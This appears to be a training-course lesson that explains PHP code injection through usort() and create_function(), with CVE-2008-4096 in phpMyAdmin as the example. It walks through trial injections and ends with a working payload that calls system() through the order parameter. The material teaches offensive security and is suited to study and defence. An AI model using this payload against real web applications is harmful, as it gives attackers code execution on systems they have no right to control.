# Course
When ordering information, developers can use two methods:

- `order by` in a SQL request;
- `usort` in PHP code.

The function `usort` is often used with the function create_function to dynamically generate the "sorting" function, based on user-controlled information. If the web application lacks potent filtering and validation, this can lead to code execution.

By `injecting a single quote`, we can get an idea of what is going on:

```php
Parse error: syntax error, unexpected '',$b->id'' (T_CONSTANT_ENCAPSED_STRING) in /var/www/index.php(29) : 
runtime-created function on line 1
 
Warning: usort() expects parameter 2 to be a valid callback, no array or string given in /var/www/index.php
 on line 29
```

The source code of the function looks like the following:
```php
ZEND_FUNCTION(create_function)
{
  [...]
  eval_code = (char *) emalloc(eval_code_length);
  sprintf(eval_code, "function " LAMBDA_TEMP_FUNCNAME "(%s){%s}", Z_STRVAL_PP(z_function_args), Z_STRVAL_PP(z_function_code));
 
  eval_name = zend_make_compiled_string_description("runtime-created function" TSRMLS_CC);
  retval = zend_eval_string(eval_code, NULL, eval_name TSRMLS_CC);
  [...]
```

We can see that the code that will be evaluated is put inside curly brackets `{...}`, and we will need this information to correctly finish the syntax, after our injection.

As opposed to the previous code injection, here, you are not injecting inside single or double quotes. We know that we need to close the statement with } and comment out the rest of the code using `//` or `#` (with encoding). We can try poking around with:

- `?order=id;}//`: we get an error message (Parse error: syntax error, unexpected ';'). We are probably missing one or more brackets.
- `?order=id);}//`: we get a **warning**. That seems about right.
- `?order=id));}//`: we get an error message (Parse error: syntax error, unexpected ')' i). We probably have too many closing brackets.

Since we now know how to finish the code correctly (a warning does not stop the execution flow), we can inject arbitrary code and gain code execution using `?order=id);}system('uname%20-a');//`, as an example.

This challenge is based on a vulnerability in PHPMyAdmin: `CVE-2008-4096`


[CVE-2008-4096](https://nvd.nist.gov/vuln/detail/CVE-2008-4096)
